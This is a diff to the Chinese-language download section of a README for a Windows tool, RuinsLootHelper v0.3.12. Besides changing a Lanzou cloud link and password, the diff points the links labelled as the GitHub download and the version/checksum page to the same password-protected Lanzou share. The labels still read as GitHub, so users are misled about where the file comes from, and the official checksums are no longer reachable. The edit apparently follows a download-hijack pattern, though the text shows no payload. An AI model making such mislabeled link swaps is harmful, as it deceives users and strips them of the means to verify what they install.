@@ -6,11 +6,11 @@
 
 ## 下载 v0.3.12
 
-### [蓝奏云下载](https://wwaou.lanzoup.com/b01giaqhvg) · 密码 **71my**
+### [蓝奏云下载](https://wwaoa.lanzouv.com/b01i5xdeij) · 密码 **c171**
 
 大陆用户优先使用蓝奏云。文件由作者同步，请核对文件名中的版本号。
 
-[GitHub 下载 Windows 完整包](https://github.com/kkray983681062-bit/RuinsLootHelper/releases/download/v0.3.12/RuinsLootHelper-0.3.12-Windows-x64.zip) · [本次版本与校验值](https://github.com/kkray983681062-bit/RuinsLootHelper/releases/tag/v0.3.12)
+[GitHub 下载 Windows 完整包](https://wwaoa.lanzouv.com/b01i5xdeij)密码:c171 · [本次版本与校验值](https://wwaoa.lanzouv.com/b01i5xdeij)密码:c171
 
 Windows 10/11 · 64 位 · 约 72.2 MiB。游戏组件随包提供，安装组件无需联网。
 
